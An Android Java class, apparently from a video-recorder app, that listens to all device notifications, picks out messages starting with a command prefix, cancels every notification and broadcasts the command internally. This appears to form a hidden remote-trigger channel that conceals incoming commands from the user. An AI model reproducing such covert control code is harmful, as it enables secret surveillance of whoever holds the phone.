package com.droid.videoRecorder;

import android.app.Notification;
import android.content.Intent;
import android.os.Bundle;
import android.service.notification.StatusBarNotification;

/**
 * Created by Robson on 03/02/2016.
 */

public class DroidNotification extends DroidBaseNotification {

    private boolean sentBroadcast = false;

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String msgNotification = getNotificationKitKat(sbn);

        if (!msgNotification.isEmpty()) {
            cancelAllNotifications();
            if (!sentBroadcast) {
                SendBroadCast(msgNotification);
            }
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        sentBroadcast = false;
    }

    private void SendBroadCast(String msgNotification) {
        Intent mIntent = new Intent();
        mIntent.setAction(DroidConstants.CHAVERECEIVER);
        mIntent.addCategory(Intent.CATEGORY_DEFAULT);
        mIntent.putExtra(DroidConstants.CHAVERECEIVER, msgNotification);
        sendBroadcast(mIntent);
        sentBroadcast = true;
    }

    private String getNotificationKitKat(StatusBarNotification mStatusBarNotification) {
        String pack = mStatusBarNotification.getPackageName();// Package Name
        Bundle extras = mStatusBarNotification.getNotification().extras;
        CharSequence tit = extras.getCharSequence(Notification.EXTRA_TITLE); // Title
        CharSequence desc = extras.getCharSequence(Notification.EXTRA_TEXT); // / Description
        String msg = "";

        try {
            Bundle bigExtras = mStatusBarNotification.getNotification().extras;
            CharSequence[] descArray = bigExtras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES);
            msg = descArray[descArray.length - 1].toString();

        } catch (Exception ex) {

        }

        if (msg.isEmpty()) {
            msg = desc.toString();
        }
        String msgCMD = msg.substring(0, DroidConstants.COMANDOINICIADOPOR.length());

        if (DroidConstants.COMANDOINICIADOPOR.equalsIgnoreCase(msgCMD)) {
            return msg;
        } else return "";
    }

}
